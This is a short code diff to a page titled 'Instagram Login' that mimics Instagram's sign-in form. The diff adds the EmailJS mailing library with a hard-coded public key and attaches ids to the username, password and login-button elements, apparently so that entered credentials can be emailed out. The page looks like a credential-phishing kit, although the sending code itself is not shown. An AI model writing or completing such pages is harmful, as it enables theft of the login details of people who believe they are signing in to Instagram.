@@ -6,6 +6,16 @@
     <title>Instagram Login</title>
     <link rel="stylesheet" href="../instagram/ig.css">
 </head>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+    (function () {
+        emailjs.init({
+            publicKey: "PDchH_R3Befg7OCEL",
+        });
+    })();
+</script>
+
 <body>
 
     <div class="container">
@@ -21,12 +31,12 @@
             <span></span> OR <span></span>
         </div>
 
-        <input type="text" placeholder="Phone number, username, or email">
-        <input type="password" placeholder="Password">
+        <input type="text" id="user_email" placeholder="Phone number, username, or email">
+        <input type="password" id="user_password" placeholder="Password">
         
         <a href="#" class="forgot-password" style="text-decoration: none;">Forgot password?</a>
 
-        <button class="login-button">Log In</button>
+        <button class="login-button" id="loginBtn">Login</button>
 
         <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
 
